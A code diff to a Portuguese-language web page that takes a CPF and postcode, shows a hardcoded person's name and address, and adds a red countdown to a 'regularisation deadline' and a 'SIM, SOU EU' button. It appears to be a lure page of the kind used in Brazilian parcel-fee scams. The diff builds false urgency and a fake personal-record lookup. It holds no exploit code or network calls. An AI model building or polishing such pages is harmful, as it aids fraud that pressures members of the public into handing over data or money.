@@ -64,6 +64,7 @@
       font-family: Arial, sans-serif;
       color: #003157;
       box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
+      text-align: left;
     }
 
     #resultado h2 {
@@ -80,6 +81,49 @@
     #resultado p span {
       font-weight: 700;
       color: #007bff;
+    }
+
+    /* Bairro e Rua em branco */
+    #res-rua,
+    #res-bairro {
+      color: white !important;
+      background-color: #003157; /* fundo azul escuro para destacar texto branco */
+      padding: 2px 6px;
+      border-radius: 4px;
+      display: inline-block;
+    }
+
+    /* Prazo centralizado e vermelho */
+    #prazo-container {
+      margin-top: 1.5rem;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.3rem;
+      color: red;
+    }
+
+    /* Botão azul SIM SOU EU */
+    #btn-sim-sou-eu {
+      margin-top: 2rem;
+      display: block;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      border-radius: 6px;
+      cursor: pointer;
+      text-align: center;
+      width: 100%;
+      max-width: 250px;
+      margin-left: auto;
+      margin-right: auto;
+      transition: background-color 0.3s ease;
+    }
+
+    #btn-sim-sou-eu:hover {
+      background-color: #0056b3;
     }
   </style>
 </head>
@@ -157,7 +201,14 @@
       <p><span>Bairro:</span> <span id="res-bairro"></span></p>
       <p><span>Cidade:</span> <span id="res-cidade"></span></p>
       <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+
+      <!-- Prazo com contagem regressiva -->
+      <div id="prazo-container">
+        Prazo para Regularização: <span id="res-prazo"></span><br />
+        <span id="countdown"></span>
+      </div>
+
+      <button id="btn-sim-sou-eu" type="button">SIM, SOU EU</button>
     </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
@@ -192,7 +243,7 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    // Função para adicionar dias e formatar data dd/mm/aaaa às hh:mm
+    // Função para adicionar dias e formatar data dd/mm/aaaa
     function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
       const prazo = new Date(dataBase);
       prazo.setDate(prazo.getDate() + diasAdicionar);
@@ -206,7 +257,27 @@
       const hh = prazo.getHours().toString().padStart(2, "0");
       const min = prazo.getMinutes().toString().padStart(2, "0");
 
-      return `${dd}/${mm}/${yyyy} às ${hh}:${min}`;
+      return {
+        text: `${dd}/${mm}/${yyyy} às ${hh}:${min}`,
+        dateObj: prazo
+      };
+    }
+
+    function atualizarContagem(prazoDate) {
+      const now = new Date().getTime();
+      const distance = prazoDate - now;
+
+      if (distance < 0) {
+        document.getElementById("countdown").textContent = "Prazo expirado!";
+        return;
+      }
+
+      const dias = Math.floor(distance / (1000 * 60 * 60 * 24));
+      const horas = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutos = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const segundos = Math.floor((distance % (1000 * 60)) / 1000);
+
+      document.getElementById("countdown").textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
     }
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
@@ -233,13 +304,16 @@
       document.getElementById("loading-container").style.display = "block";
 
       // Simulação de consulta — aqui você deve chamar seu backend real
-      // Exemplo: fetch('consulta.php?cpf=...&cep=...')
+      // Por exemplo, fetch('consulta.php?cpf=...&cep=...')
       // e pegar os dados do JSON retornado.
 
       // Simular delay de 2 segundos
       await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      // Simulação de dados recebidos - substituir com dados reais da sua consulta
+      // Simulação de dados recebidos
+      // Você pode substituir isso por dados reais da sua consulta
+      const prazoData = formatarPrazo(new Date(), 10, 23, 59); // prazo 10 dias a partir de hoje
+
       const dadosPessoa = {
         nome: "Rosiane Oliveira Da Silva",
         cpf: formatarCPF(cpfRaw),
@@ -249,7 +323,8 @@
         bairro: "Centro",
         cidade: "Porciúncula",
         estado: "RJ",
-        prazoRegularizacao: formatarPrazo(new Date(), 10, 23, 59), // prazo 10 dias a partir de hoje
+        prazoRegularizacaoText: prazoData.text,
+        prazoRegularizacaoDate: prazoData.dateObj,
       };
 
       // Preencher resultado
@@ -261,12 +336,18 @@
       document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
       document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
       document.getElementById("res-estado").textContent = dadosPessoa.estado;
-      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacao;
+      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacaoText;
 
       // Esconde formulário e loading, mostra resultado
       document.getElementById("loading-container").style.display = "none";
       document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
+
+      // Atualiza contagem regressiva a cada segundo
+      atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
+      const intervalId = setInterval(() => {
+        atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
+      }, 1000);
     });
   </script>
 </body>
